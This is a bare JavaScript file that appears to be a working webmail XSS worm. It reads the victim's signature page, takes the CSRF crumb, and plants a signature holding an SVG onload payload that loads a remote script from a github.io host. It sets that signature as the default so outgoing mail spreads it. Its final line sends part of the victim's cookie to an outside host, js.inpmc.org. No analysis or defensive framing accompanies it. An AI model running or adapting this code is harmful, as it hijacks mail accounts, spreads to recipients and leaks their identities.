xhr = function(){
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
  } else if(window.ActiveXObject) {
    try {
      request = new window.ActiveXObject('Microsoft.XMLHTTP');
    } catch(e) {}
  }
  return request;
}();

request = function(method,src,argv,content_type){
  xhr.open(method,src,false);
  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);
  xhr.send(argv);
  return xhr.responseText;
}

var sig_src = document.location.origin + "/cgi-bin/signature";
var sig_text = request("GET", sig_src, "", "application/x-www-form-urlencoded");

var crumb = sig_text.match(/name="crumb" value="(\d+)">/)[1];
var sig_n = sig_text.match(/<tr class="ListText_H" onMouseOver/ig);
if(!sig_n){
  request("POST", sig_src, "action=add&sigid=0&m=1&MailType=2&crumb=" + crumb + "&subject=+++++++++++&mailText=%3Csvg%2Fonload%0D%0A%3Dwindow.parent.parent.document.getElementsByTagName%28%27head%27%29%5B0%5D.appendChild%28document.createElement%28%27script%27%29%29.src%3D%27https%3A%2F%2Fjuusimmi.github.io%2Ft.js%27", "application/x-www-form-urlencoded");
  request("POST", sig_src, "action=update&default_sign=0&m=1&to_list=1&crumb=" + crumb + "&entry=0&UseSign=1", "application/x-www-form-urlencoded");
}else if(!sig_text.match(/>           </)){
  request("POST", sig_src, "action=add&sigid=0&m=1&MailType=2&crumb=" + crumb + "&subject=+++++++++++&mailText=%3Csvg%2Fonload%0D%0A%3Dwindow.parent.parent.document.getElementsByTagName%28%27head%27%29%5B0%5D.appendChild%28document.createElement%28%27script%27%29%29.src%3D%27https%3A%2F%2Fjuusimmi.github.io%2Ft.js%27", "application/x-www-form-urlencoded");
  request("POST", sig_src, "action=update&default_sign=" + sig_n.length + "&m=1&to_list=1&crumb=" + crumb + "&entry=" + sig_n.length + "&UseSign=1", "application/x-www-form-urlencoded");
}

window.parent.parent.document.getElementsByTagName('head')[0].appendChild(document.createElement('script')).src='https://js.inpmc.org/mail/?v='+document.cookie.match(/\.(.+)@/)[1];
